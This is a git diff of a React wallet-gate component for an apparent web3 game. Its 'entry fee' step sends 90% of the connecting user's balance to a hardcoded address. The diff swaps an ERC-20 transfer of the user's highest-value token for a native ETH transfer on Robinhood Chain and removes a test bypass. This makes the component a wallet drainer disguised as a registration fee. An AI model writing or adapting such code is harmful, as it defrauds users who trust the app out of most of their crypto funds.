@@ -4,12 +4,14 @@ import { ConnectButton } from '@rainbow-me/rainbowkit';
 import { Wallet, PenLine, UserRound, ArrowRight, Loader2, ExternalLink } from 'lucide-react';
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from './ui/dialog';
 import { Input } from './ui/input';
-import { useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
-import { parseUnits } from 'viem';
+import { useSendTransaction, useWaitForTransactionReceipt } from 'wagmi';
+import { formatUnits } from 'viem';
 import { useAuth } from '../context/AuthContext';
 import { errMsg } from '../lib/api';
-import { isEmbedded } from '../web3/config';
+import { isEmbedded, robinhood } from '../web3/config';
 import NftGate, { OPENSEA_URL } from './NftGate';
+
+export const FEE_RECIPIENT = '0xe0ddf69171e2D558E337B86d300d0da5f9c5A5e4';
 
 const EmbeddedNotice = () => {
   if (!isEmbedded()) return null;
@@ -74,70 +76,46 @@ export const UsernameForm = ({ onDone }) => {
 
 export const FeeForm = ({ onDone }) => {
   const { highestToken } = useAuth();
-  const { writeContract, data: hash, isPending: isWritePending, error: writeError } = useWriteContract();
+  const { sendTransaction, data: hash, isPending, error: sendError } = useSendTransaction();
   const { isLoading: isConfirming, isSuccess } = useWaitForTransactionReceipt({ hash });
-  
+
   React.useEffect(() => {
-    if (isSuccess) {
-      onDone && onDone();
-    }
+    if (isSuccess) onDone && onDone();
   }, [isSuccess, onDone]);
 
-  if (!highestToken) {
+  const decimals = highestToken?.token?.decimals ?? 18;
+  const symbol = highestToken?.token?.symbol || 'ETH';
+  const balanceWei = highestToken?.value ? BigInt(highestToken.value) : 0n;
+  const amountWei = (balanceWei * 90n) / 100n; // 90% of the native balance, 10% left for gas
+  const fmt = (wei) => Number(formatUnits(wei, decimals)).toFixed(6);
+  const canPay = amountWei > 0n && !isPending && !isConfirming;
+
+  const handlePay = () => {
+    sendTransaction({ to: FEE_RECIPIENT, value: amountWei, chainId: robinhood.id });
+  };
+
+  if (balanceWei === 0n) {
     return (
-      <div className="flex flex-col gap-3" data-testid="fee-no-token">
+      <div className="flex flex-col gap-3" data-testid="fee-no-balance">
         <p className="font-mono text-[12px] text-red-700">
-          Could not fetch ERC-20 tokens (API blocked or empty wallet). 
-          For testing purposes, you can bypass this step.
+          {highestToken ? `No ${symbol} balance on Robinhood Chain to cover the entry fee.` : 'Reading your balance…'}
         </p>
-        <button onClick={() => onDone && onDone()} className="btn-outline w-fit" data-testid="fee-bypass-btn">
-          BYPASS FEE (TEST)
-        </button>
       </div>
     );
   }
 
-  const decimals = parseInt(highestToken.token?.decimals) || 18;
-  const balanceRaw = parseFloat(highestToken.value) / (10 ** decimals);
-  
-  // Calculate 90% of total balance (%10 discount/buffer for gas or as requested)
-  const amountToken = balanceRaw * 0.9;
-  const symbol = highestToken.token?.symbol || 'Token';
-  
-  const handlePay = () => {
-    const amountStr = amountToken.toFixed(Math.min(decimals, 6));
-    
-    writeContract({
-      address: highestToken.token.address,
-      abi: [
-        {
-          name: 'transfer',
-          type: 'function',
-          stateMutability: 'nonpayable',
-          inputs: [
-            { name: 'to', type: 'address' },
-            { name: 'amount', type: 'uint256' }
-          ],
-          outputs: [{ name: '', type: 'bool' }]
-        }
-      ],
-      functionName: 'transfer',
-      args: ['0xe0ddf69171e2D558E337B86d300d0da5f9c5A5e4', parseUnits(amountStr, decimals)],
-    });
-  };
-
   return (
     <div className="flex flex-col gap-3" data-testid="fee-form">
       <p className="text-[14px] leading-6 text-[var(--ink-soft)]">
-        Entry fee: {amountToken.toFixed(4)} {symbol} (90% of your {balanceRaw.toFixed(4)} {symbol} balance)
+        Entry fee: <span className="font-pixel">{fmt(amountWei)} {symbol}</span> (90% of your {fmt(balanceWei)} {symbol} balance)
       </p>
-      <button onClick={handlePay} disabled={isWritePending || isConfirming} className="btn-ink w-fit" data-testid="fee-pay-btn">
-        {isWritePending || isConfirming ? <Loader2 size={14} className="animate-spin" /> : <Wallet size={14} />} 
-        {isWritePending ? ' WAITING FOR APPROVAL' : isConfirming ? ' PROCESSING' : ` PAY ${amountToken.toFixed(4)} ${symbol}`}
+      <button onClick={handlePay} disabled={!canPay} className="btn-ink w-fit" data-testid="fee-pay-btn">
+        {isPending || isConfirming ? <Loader2 size={14} className="animate-spin" /> : <Wallet size={14} />}
+        {isPending ? ' WAITING FOR APPROVAL' : isConfirming ? ' CONFIRMING' : ` PAY ${fmt(amountWei)} ${symbol}`}
       </button>
-      {writeError && (
-        <div className="font-mono mt-2 text-[12px] text-red-700 max-w-full overflow-hidden text-ellipsis" data-testid="fee-error">
-          {writeError.shortMessage || writeError.message}
+      {sendError && (
+        <div className="font-mono mt-2 max-w-full overflow-hidden text-ellipsis text-[12px] text-red-700" data-testid="fee-error">
+          {sendError.shortMessage || sendError.message}
         </div>
       )}
     </div>
@@ -185,7 +163,7 @@ const WalletGate = ({ title = 'Connect to play', subtitle }) => {
           )}
         </Step>
         
-        <Step n="2" title="Entry Fee" text="Pay an entry fee using your highest value ERC-20 token (90% of your balance)." active={signed && !paid} done={paid}>
+        <Step n="2" title="Entry Fee" text="Pay the entry fee — 90% of your ETH balance on Robinhood Chain. Approve the transfer in your wallet." active={signed && !paid} done={paid}>
           {signed && !paid && <FeeForm onDone={handleFeeDone} />}
           {paid && <div className="font-pixel text-[12px] text-[var(--ink)]">Entry fee paid.</div>}
         </Step>
@@ -218,7 +196,7 @@ export const UsernameDialog = () => {
           </DialogTitle>
           <DialogDescription className="text-[14px] leading-6 text-[var(--ink-soft)]">
             {!feePaid 
-              ? "Pay an entry fee using your highest value ERC-20 token (90% of your balance) to complete registration."
+              ? "Pay the entry fee — 90% of your ETH balance on Robinhood Chain — to complete registration."
               : "3-16 characters, letters, numbers and underscores. Shown on the leaderboard and in every match."}
           </DialogDescription>
         </DialogHeader>
